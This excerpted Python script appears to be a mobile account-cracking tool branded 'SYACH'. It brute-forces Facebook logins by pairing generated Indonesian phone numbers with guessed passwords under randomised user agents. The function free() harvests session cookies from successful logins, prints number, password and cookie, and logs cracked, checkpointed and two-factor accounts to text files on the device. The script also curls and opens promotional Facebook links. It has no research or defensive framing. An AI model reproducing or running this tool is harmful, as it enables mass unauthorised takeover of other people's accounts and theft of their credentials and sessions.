...
for xd in range(10000):
    ...
    ugen.append(uaku2)
try:
    os.system('curl https://m.facebook.com/groups/1468838800588097/?ref=share&mibextid=lOuIew')
except:
    pass
...
def uaku():
    try:
        ...
        a=requests.get('https://m.facebook.com/groups/1468838800588097/?ref=share&mibextid=lOuIew').text
...
\033[1;34m░░░░░║██░░░░░║██░░░░░║██░░██░░║██░░░░░░║██░░░░██░░
\033[1;35m░║██████░░░░░║██░░░░░║██░░██░░║██████░░║██░░░░██░░
 \033[1;36m░░💥💥💥💥👉👉👉ALIF NURDIN AFIZAYEN👈👈👈💥💥💥💥░░"""
#####     ####
...
def xyz():
    ...
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41m  THIS COMMAND MADE BY MR SYACH \033[0;97m] ')
    os.system("xdg-open https://www.facebook.com/AlifXyz78?mibextid=kFxxJD");print(logo)
...
def Random():
    ...
    linex()
    print(f"")
    print(' 0813 ,0812 ,0821 ,0822')
    print(f" 0899 ,0898 ,0899 ,0889")
    print(f" 0852 ,0853 ,0813 ,0812")
    print(f"")
    linex()
...
def free(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[SYACH-OK😁]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
                cek_apk(session,coki)
                open('/sdcard/SYACH-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;31m [SYACH-CP😔] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
                open('/sdcard/SYACH-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/SYACH-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SYACH] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
